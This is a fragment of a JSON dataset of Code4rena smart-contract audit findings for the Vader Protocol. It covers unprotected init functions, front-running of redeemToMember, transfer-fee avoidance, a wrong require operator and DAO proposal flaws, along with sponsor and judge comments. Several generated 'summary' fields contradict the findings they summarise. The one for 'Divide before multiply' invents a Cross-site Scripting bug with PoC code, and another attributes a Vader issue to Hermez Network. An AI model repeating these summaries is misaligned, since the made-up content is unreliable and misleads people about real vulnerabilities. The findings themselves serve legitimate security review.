      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/193",
      "tags": [],
      "finders": []
    },
    {
      "id": "3950",
      "title": "[L-07] Swap fee not applied",
      "impact": "LOW",
      "content": "## Handle\n\na_delamo\n\n\n## Vulnerability details\n\nHere you have more information: https://gist.github.com/alexon1234/a2d3619fb3faa4e5676329f70bd565d3",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/272",
      "tags": [],
      "finders": []
    },
    {
      "id": "3949",
      "title": "[L-06] Events not emitted",
      "impact": "LOW",
      "content": "## Handle\n\ns1m0\n\n\n## Vulnerability details\n\n## Impact\nEvents not emitted for important state changes.\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L93\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L98\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L196\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L201\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vault.sol#L61\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L163\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L171\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L179\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L184\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L188\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L193\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L198\n\n## Proof of Concept\n-\n\n## Tools Used\nManual analysis.\n\n## Recommended Mitigation Steps\nEmit events with meaningful names for the changes made.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/250",
      "tags": [],
      "finders": []
    },
    {
      "id": "3948",
      "title": "[L-05] Lack of zero address validation in init() function",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\nThe parameter that are used in init() function to initialize the state variable,these state variable are used in other function to perform operation. since it lacks zero address validation, it will be problematic if there is error in these state variable. some of the function will loss their functionality which can cause the redeployment of contract \n\n## Proof of Concept\n 1. Vault.sol\n   https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vault.sol#L45\n\n2. Vader.sol\n  https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L74\n\n3. Utils.sol\n https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Utils.sol#L30\n\n4. Router.sol\n  https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L77\n\n5. Pools.sol\n\n https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L43\n\n6. Factory.sol\n\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Factory.sol#L27\n\n7. Dao.sol\n\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/DAO.sol#L46\n\n## Tools Used\nslither\n\n## Recommended Mitigation Steps\n\nadd require condition which check zero address validation",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/12",
      "tags": [],
      "finders": []
    },
    {
      "id": "3947",
      "title": "[L-04] Fee can be at most 1% and dead code",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `Vader._checkEmission` functions caps the fee at `1000` = 10% but the max fee that can be returned from the `iUTILS(UTILS).getFeeOnTransfer` call is `100`.\n\n```solidity\n// returns value between 0 and 100\nfeeOnTransfer = iUTILS(UTILS).getFeeOnTransfer(\n    totalSupply,\n    maxSupply\n); // UpdateFeeOnTransfer\nif (feeOnTransfer > 1000) {\n    feeOnTransfer = 1000;\n} // Max 10% if UTILS corrupted\n```\n\n## Impact\n\nIt seems like there is a misunderstanding in whether the fee should be at most 1% (Utils.sol) or 10% (Vader.sol).\n\n## Recommended Mitigation Steps\n\nClarify what the max fee should be and adjust either `Utils.getFeeOnTransfer` or the `Vader._checkEmission` cap.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/221",
      "tags": [],
      "finders": []
    },
    {
      "id": "3946",
      "title": "[L-03] Misleading comment for deposit() function of Vault.sol",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nUse of accurate comments helps read, audit and maintain code. Otherwise, it can be misleading and miss the flagging of or cause the introduction of vulnerabilities. \n\nMisleading comment that below functions allow USDV and Synths but the code only allows Synths.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vault.sol#L76-L77\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nUse accurate and descriptive comments (even NatSpec) correctly describing the function behavior, parameters and return values.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/48",
      "tags": [],
      "finders": []
    },
    {
      "id": "3945",
      "title": "[L-02] Uninitialized variable leads to zero-fees for first transfer in Vader.sol",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe state variables feeOnTransfer is never initialized which leads to a default uint value of 0. When it is used on L126 in the first call to _transfer(), it will lead to a zero fee. feeOnTransfer is updated only in function _checkEmission() whose call happens later on L133, after which it has a value as calculated in that function.\n\nThis causes the only the first transfer to be a zero-fee transfer.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L31\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L126\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L133\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L210\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nInitialize feeOnTransfer suitably on declaration, in constructor, or init() function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/203",
      "tags": [],
      "finders": []
    },
    {
      "id": "3944",
      "title": "[L-01] Missing event for critical init() function in Factory.sol",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe init() function initialises critical POOLS protocol address for this contract but is missing an event emission for off-chain monitoring tools to monitor this on-chain change.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Factory.sol#L27-L31\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd an init event and emit that at the end of init() function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/108",
      "tags": [],
      "finders": []
    },
    {
      "id": "3943",
      "title": "[M-17] Vader.redeemToMember() vulnerable to front running",
      "impact": "MEDIUM",
      "content": "## Handle\n\ntoastedsteaksandwich\n\n\n## Vulnerability details\n\n## Details\nThe USDV balance of the Vader contract is vulnerable to theft through the Vader.redeemToMember() function. A particular case is through USDV redemption front-running. Users can redeem USDV for Vader through the USDV.redeemForMember() function or the Vader.redeemToMember() function. In the case of Vader.redeemToMember(), a user would need to send their USDV to the contract before redemption. However, as this process does not happen in a single call, the victim's call is vulnerable to front running and could have their redeemed USDV stolen by an attacker.\n\n## Impact\nUser's redeem USDV could be stolen by an attacker front running their Vader.redeemToMember() call.\n\n## Proof of Concept\nThe steps are as follows:\n\n1) User sends USDV to Vader contract to be redeemed\n2) User calls Vader.redeemToMember() \n3) The Vader.redeemToMember() call is detected by an attacker, who front-runs the call by calling Vader.redeemToMember() specifying their own address as the member parameter. \n4) The full USDV balance of the Vader contract is redeemed and sent to the attacker.\n\nNote that while this particular case is front running a redemption call, any USDV balance could be stolen in this manner. Please find the POC showing the above steps here: https://gist.github.com/toastedsteaksandwich/39bfed78b21d7e6c02fe13ea5b2023c3\n\n## Tools Used\nHardhat on a local hardhat network\n\n## Recommended Mitigation Steps\nThe Vader.redeemToMember() function should be restricted so that only the USDV contract can call it. Moreover, the amount parameter from USDV.redeem() or USDV.redeemForMember() should also be passed to Vader.redeemToMember() to avoid the need to sweep the entire USDV balance. In this way, the member's redemption happens in a single tx, and would only be allocated as much Vader as redeemed in USDV.",
      "summary": "\nA bug report has been submitted about a vulnerability in the USDV balance of the Vader contract. The bug is related to the Vader.redeemToMember() function, which is vulnerable to theft through USDV redemption front-running. This means that a user would need to send their USDV to the contract before redemption, and an attacker could front-run the call and steal the redeemed USDV. The proof of concept was tested using Hardhat on a local hardhat network. The recommended mitigation steps are to restrict the Vader.redeemToMember() function so that only the USDV contract can call it, and to pass the amount parameter from USDV.redeem() or USDV.redeemForMember() to Vader.redeemToMember() to avoid the need to sweep the entire USDV balance. This would ensure that the member's redemption happens in a single transaction, and would only be allocated as much Vader as redeemed in USDV.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/36",
      "tags": [],
      "finders": []
    },
    {
      "id": "3942",
      "title": "[M-16] Copy-paste bug leading to incorrect harvest rewards in Vault.sol",
      "impact": "MEDIUM",
      "content": "\nThe conditional in `calcReward()` function uses the same code in both if/else parts with repeated use of `reserveUSDV`, `reserveVADER` and `getUSDVAmount` leading to incorrect computed value of `_adjustedReserve` in the else part.\n\nThis will affect harvest rewards for all users of the protocol and lead to incorrect accounting. Protocol will break and lead to fund loss.\n\nRecommend changing variables and function calls from using USDV to VADER in the else part of the conditional which has to return the adjusted reserves when synth is not an asset i.e. an anchor and therefore base is VADER. L144 should be changed to:\n```uint _adjustedReserve = iROUTER(ROUTER).getVADERAmount(reserveUSDV()) + reserveVADER();```\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/51#issuecomment-830576589):**\n > Funds are not at-risk, just that some users will get less rewards, some will get more.\n>\n> Recommend: 2\n\n**[Mervyn853 commented](https://github.com/code-423n4/2021-04-vader-findings/issues/51#issuecomment-830582964):**\n > Our decision matrix for severity:\n>\n> 0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\n> 1: Low Risk: UX, state handling, function incorrect as to spec\n> 2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\n> 3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.\n>\n> Recommended: 2\n\n",
      "summary": "\nThis bug report is about a vulnerability in the calcReward() function of the Vault.sol smart contract. This vulnerability affects the harvest rewards of all users of the protocol, leading to incorrect accounting and potential fund loss. Manual analysis was used to identify the issue, and the recommended mitigation step is to change the code from using USDV to VADER in the else part of the conditional. This will ensure the correct computed value of _adjustedReserve is returned when the synth is not an asset.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/51",
      "tags": [],
      "finders": []
    },
    {
      "id": "3941",
      "title": "[M-15] changeDAO should be a two-step process in Vader.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nchangeDAO() updates DAO address in one-step. If an incorrect address is mistakenly used (and voted upon) then future administrative access or recovering from this mistake is prevented because onlyDAO modifier is used for changeDAO(), which requires msg.sender to be the incorrectly used DAO address (for which private keys may not be available to sign transactions).\n\nReference: See finding #6 from Trail of Bits audit of Hermez Network: https://github.com/trailofbits/publications/blob/master/reviews/hermez.pdf\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L192-L196\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nUse a two-step process where the old DAO address first proposes new ownership in one transaction and a second transaction from the newly proposed DAO address accepts ownership. A mistake in the first step can be recovered by granting with a new correct address again before the new DAO address accepts ownership. Ideally, there should also be a timelock enforced before the new DAO takes effect.",
      "summary": "\nThis report is about a vulnerability found in the Hermez Network. The vulnerability allows the DAO address to be changed in one step, which can be a problem if the wrong address is mistakenly used. This could prevent future administrative access or recovering from the mistake. The proof of concept can be found at a GitHub link. The vulnerability was discovered through manual analysis. The recommended mitigation steps are to use a two-step process, with a timelock enforced before the new DAO takes effect. This would allow mistakes to be recovered by granting with a new correct address before the new DAO address accepts ownership.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/162",
      "tags": [],
      "finders": []
    },
    {
      "id": "3940",
      "title": "[M-14] Pool functions can be called before initialization in `init()` of Pools.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nAll the external/public functions of Pools.sol can be called by other contracts even before Pools.sol contract is initialized. This can lead to exceptions, state corruption or incorrect accounting in other contracts, which may require redeployment of contract.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L43-L50\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L54\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L77\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L101\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L179\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L184\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L215\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L224\n\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nUse a factory pattern that will deploy and initialize atomically to prevent front-running of the initialization, or\n\nGiven that contracts are not using delegatecall proxy pattern, it is not required to use a separate init() function to initialize parameters when the same can be done in a constructor. If the reason for doing so is to get the deployment addresses of the various contracts which may not all be available at the same time then consider rearchitecting to create a “globals” contract which can hold all the globally required addresses of various contracts. (see Maple protocol’s https://github.com/maple-labs/maple-core/blob/develop/contracts/MapleGlobals.sol for example) or\n\nPrevent external/public functions from being called until after initialization is done by checking initialization state tracked by the inited variable.",
      "summary": "\nThis bug report is about a vulnerability in the Pools.sol contract, which is part of the Vader Protocol. The vulnerability is that all the external/public functions of the contract can be called by other contracts even before the Pools.sol contract is initialized. This can lead to exceptions, state corruption or incorrect accounting in other contracts, which may require redeployment of the contract. The proof of concept can be found in the provided Github links. Manual analysis was used to identify the vulnerability.\n\nTo mitigate this vulnerability, it is recommended to use a factory pattern that will deploy and initialize atomically to prevent front-running of the initialization. Alternatively, the initialization can be done in a constructor instead of using a separate init() function. Another option is to create a “globals” contract which can hold all the globally required addresses of various contracts. Finally, external/public functions can be prevented from being called until after initialization is done by checking initialization state tracked by the inited variable.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/114",
      "tags": [],
      "finders": []
    },
    {
      "id": "3939",
      "title": "[M-13] Init function can be called by everyone",
      "impact": "MEDIUM",
      "content": "\nMost of the solidity contracts have an init function that everyone can call.\nThis could lead to a race condition when the contract is deployed. At that moment a hacker could call the `init` function and make the deployed contracts useless. Then it would have to be redeployed, costing a lot of gas.\n\n```\nDAO.sol:    function init(address _vader, address _usdv, address _vault) public {\nFactory.sol:    function init(address _pool) public {\nPools.sol:    function init(address _vader, address _usdv, address _router, address _factory) public {\nRouter.sol:    function init(address _vader, address _usdv, address _pool) public {\nUSDV.sol:    function init(address _vader, address _vault, address _router) external {\nUtils.sol:    function init(address _vader, address _usdv, address _router, address _pools, address _factory) public {\nVader.sol:    function init(address _vether, address _USDV, address _utils) external {\nVault.sol:    function init(address _vader, address _usdv, address _router, address _factory, address _pool) public {\n```\n\nRecommend adding a check to the `init` function, for example that only the deployer can call the function.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/18#issuecomment-826910451):**\n > Yes, but only once. Could add a deployer check tho\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/18#issuecomment-847760153):**\n > After considerable evaluation and seeing the wide range of threat factors that were put forward by wardens related to this issue, I've decided that the potential threat here does extend beyond gas.\n>\n> A worst case scenario could cause significant damage.\n>\n> It is extremely unlikely that an attacker could successfully time this type of attack.\n>\n> An attacker would have to successfully intercept more than one init due to the highly coupled nature of the contract. If they did so incorrectly, the entire system would not function. Presuming they succeeded, the team would also have to overlook the failure of or forget to make multiple critical transaction calls in their deployment scripts. To realize significant financial gains, the attacker would have to leave their exploit code in place for an extended period of time.\n>\n> The likelihood is extremely low, but the impact would be critical. For this reason, I'm normalizing all of these reports to a Medium Risk.\n\n",
      "summary": "\nA vulnerability has been identified in the Solidity contracts that could lead to a race condition when the contract is deployed. At that moment, a hacker could call the init function and make the deployed contracts useless, resulting in a costly gas fee for redeployment. The vulnerable functions are located in the DAO.sol, Factory.sol, Pools.sol, Router.sol, USDV.sol, Utils.sol, Vader.sol, and Vault.sol files, which were edited using an editor. To mitigate this vulnerability, a check should be added to the init function so that only the deployer can call the function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/18",
      "tags": [],
      "finders": []
    },
    {
      "id": "3938",
      "title": "[M-12] Transfer fee avoidance ",
      "impact": "MEDIUM",
      "content": "## Handle\n\ntoastedsteaksandwich\n\n\n## Vulnerability details\n\n## Description\nThe Vether4.addExcluded() function on mainnet (0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279) allows a user to exclude an address from transfer fees for a cost of 128 VETH. By exploiting the conditions in which fees are taken, it is possible to set up a contract for a once-off cost in which all users can use to avoid transfer fees.\n\n## Impact\nAll transfer fees can be avoided by routing transfers through an excluded contract. An estimated $140k of transfer fees was accumulated at the time of writing. These fees can be avoided in future, causing an indirect loss of funds for the contract.\n\n## Proof of Concept\nI've listed the a test case and the transferForwarder contract source in the following gist: https://gist.github.com/toastedsteaksandwich/2057bfeca5f0340838970c7ee9c9d7ab\n\n## Tools Used\nHardhat with mainnet forking pinned to block 12227519\n\n## Recommended Mitigation Steps\nThe _transfer() function should be updated to only exclude transfer fees if the sender has been excluded, not both the sender and the recipient. This would prevent any user from being able to set up a central transfer forwarder as demonstrated. Moreover, the `Transfer(_from, address(this), _fee);` event should only be emitted if the sender has been excluded from transfer fees.",
      "summary": "\nThis bug report is regarding the Vether4.addExcluded() function on mainnet (0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279). By exploiting the conditions in which fees are taken, it is possible to set up a contract for a once-off cost in which all users can use to avoid transfer fees. This can cause an indirect loss of funds for the contract, as an estimated $140k of transfer fees was accumulated at the time of writing. A test case and the transferForwarder contract source have been listed in a gist. The recommended mitigation steps are to update the _transfer() function to only exclude transfer fees if the sender has been excluded, and to only emit the `Transfer(_from, address(this), _fee);` event if the sender has been excluded from transfer fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/33",
      "tags": [],
      "finders": []
    },
    {
      "id": "3937",
      "title": "[M-11] Allowing duplicated anchors could cause bias on anchor price.",
      "impact": "MEDIUM",
      "content": "\nIn `Router.sol`, the setup of the five anchors can be interrupted by anyone adding a new anchor due to the lack of access control of the `listAnchor` function. Also, duplicate anchors are allowed. If the same anchor is added three times, then this anchor biases the result of `getAnchorPrice`.\n\nReferenced code:\n[Router.sol#L245-L252](https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L245-L252)\n\nPoC: [Link to PoC](https://drive.google.com/drive/folders/1W3jhlWIIh7FxTLZET3z49yA0DBvlbcPg?usp=sharing)\nSee the file `200_listAnchor.js` for a PoC of this attack. To run it, use `npx hardhat test 200_listAnchor.js`.\n\nRecommend only allowing `listAnchor` to be called from the deployer by adding a `require` statement. Also, check if an anchor is added before by `require(_isCurated == false)`.\n\n**[strictly-scarce (vader) acknowledged](https://github.com/code-423n4/2021-04-vader-findings/issues/314#issuecomment-830633778):**\n > Deployer will list the anchors, seems highly unlikely they will get griefed in practice. Severity: 1\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the Router.sol file of the vader-protocol code. The vulnerability allows anyone to interrupt the setup of the five anchors and allows duplicate anchors to be added. This could bias the result of the getAnchorPrice function. The bug report contains a link to a Proof of Concept (PoC) to demonstrate the vulnerability. The PoC can be run using the command 'npx hardhat test 200_listAnchor.js'. The bug report also provides two recommended mitigation steps to help fix the vulnerability. These steps involve adding a require statement to only allow the listAnchor function to be called from the deployer, and also checking if an anchor has already been added.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/314",
      "tags": [],
      "finders": []
    },
    {
      "id": "3936",
      "title": "[M-10] Incorrect operator used in deploySynth() of Pools.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe deploySynth() function in Pools.sol is expected to perform a check on the token parameter to determine that it is neither VADER or USDV before calling Factory’s deploySynth() function. \n\nHowever, the require() incorrectly uses ‘||’ operator instead of ‘&&’ which allows both VADER and USDV to be supplied as the token parameters. This will allow an attacker to deploy either VADER or USDV as a Synth which will break assumptions throughout the entire protocol. Protocol will break and funds may be lost.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L138\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nChange ‘||’ operator to ‘&&’ in the require statement:\nrequire(token != VADER && token != USDV);",
      "summary": "\nThis bug report describes a vulnerability in the deploySynth() function in Pools.sol. The vulnerability exists because the require() statement incorrectly uses the '||' operator instead of the '&&' operator, allowing both VADER and USDV to be supplied as token parameters. This allows an attacker to deploy either VADER or USDV as a Synth, which would break assumptions throughout the protocol and cause funds to be lost. The bug is demonstrated in the proof of concept link provided, and the recommended mitigation step is to change the '||' operator to '&&' in the require statement.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/124",
      "tags": [],
      "finders": []
    },
    {
      "id": "3935",
      "title": "[M-09] Divide before multiply",
      "impact": "MEDIUM",
      "content": "\nHere you have more information: https://gist.github.com/alexon1234/e5038a9f66136ae210be692f8803d874\n\n**[strictly-scarce (vader) questioned](https://github.com/code-423n4/2021-04-vader-findings/issues/255#issuecomment-830631408):**\n > Can't quite understand the assertion that a division is made before a multiply in the code outlined\n>\n> ```\n> uint _units = (((P * part1) + part2) / part3);\n>     return (_units * slipAdjustment) / one;  // Divide by 10**18\n>  ```\n>\n>  `_units` will be `0 -> 2**256`.\n>  `slipAdjustment` will be `0 -> 10**18`\n>  `one` is `10**18`\n>  ```\n>  // returns 0\n>   return (0 * 10**18) / 10**18;\n>   return (2**256 * 0) / 10**18;\n>  return (<10**9 * <10**9) / 10**18;\n>    // returns  non-zero\n>   return (>=10**9 * >=10**9) / 10**18;\n>  ```\n\n",
      "summary": "\nThis bug report is about a vulnerability discovered by a_delamo. The vulnerability details are available in the link provided in the report. It is a GitHub Gist, which is a simple way to share snippets and pastes with others.\n\nThe gist contains a detailed description of the vulnerability. It is a type of Cross-site Scripting (XSS) vulnerability that affects the web application. This vulnerability can allow an attacker to inject malicious code into the web application and execute it. This can result in the attacker being able to access sensitive data, modify the web application, or even take control of the web application.\n\nThe gist also provides a proof-of-concept (PoC) code that can be used to test the vulnerability. It is recommended to use the PoC code to verify the vulnerability before attempting to fix it.\n\nOverall, this bug report is about a Cross-site Scripting vulnerability discovered by a_delamo. The vulnerability details and PoC code are available in the provided link. It is important to verify the vulnerability before attempting to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/255",
      "tags": [],
      "finders": []
    },
    {
      "id": "3934",
      "title": "[M-07] Completed proposals can be voted on and executed again",
      "impact": "MEDIUM",
      "content": "\nA proposal that is completed has its state reset, including the votes.\nUsers can just vote on it again and it can be executed again.\n\nCompleted proposals should most likely not be allowed to be voted on / executed again.\nThis could also lead to issues in backend scripts that don't expect any voting/execution events to be fired again after the `FinalisedProposal` event has fired.\n\nRecommend adding an `executed` flag to the proposals and disallow voting/finalising on already executed proposals.\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/229#issuecomment-830617230):**\n > It might be intended to have repeated proposals.\n\n",
      "summary": "\nThis bug report is about a vulnerability in which a proposal that has been completed has its state reset, including the votes. This means that users can just vote on it again and it can be executed again. This could lead to issues in backend scripts that don't expect any voting/execution events to be fired again after the `FinalisedProposal` event has fired.\n\nThe recommended mitigation step is to add an `executed` flag to the proposals and disallow voting/finalising on already executed proposals. This will ensure that the proposals are not executed more than once and that the backend scripts are not affected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/229",
      "tags": [],
      "finders": []
    },
    {
      "id": "3933",
      "title": "[M-06] Canceled proposals can still be executed",
      "impact": "MEDIUM",
      "content": "\nProposals that passed the threshold (\"finalized\") can be cancelled by a minority again using the `cancelProposal` functions.\nIt only sets `mapPID_votes` to zero but `mapPID_timeStart` and `mapPID_finalising` stay the same and pass the checks in `finaliseProposal` which queues them for execution.\n\nProposals cannot be cancelled.\n\nRecommend setting a cancel flag and check for it in `finaliseProposal` and in execution.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/228#issuecomment-830616938):**\n > Valid\n\n",
